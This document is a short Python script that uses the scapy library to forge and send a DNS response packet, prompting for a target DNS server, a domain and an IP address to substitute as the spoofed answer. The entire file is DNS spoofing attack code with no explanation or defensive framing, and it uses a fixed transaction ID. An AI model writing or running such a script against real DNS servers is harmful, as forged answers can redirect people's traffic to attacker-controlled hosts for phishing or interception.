from scapy.all import DNS, DNSRR,DNSQR, IP, UDP, sr1

# Create an IP packet with source and destination IP addresses
ip_packet = IP(dst=input("dns ip: "))

# Create a UDP packet with source and destination ports
udp_packet = UDP(sport=53, dport=53)

# Create a DNS response packet with a spoofed answer
domain = input("enter domain: ")
spoofed = input("enter spoofed ip: ")
dns_response = DNS(id=0xAAAA, qr=1, qdcount=1, ancount=1,
                   qd=DNSQR(qname=domain),
                   an=DNSRR(rrname=domain, rdata=spoofed))

# Combine all packets
packet = ip_packet / udp_packet / dns_response

# Send the packet
response = sr1(packet)
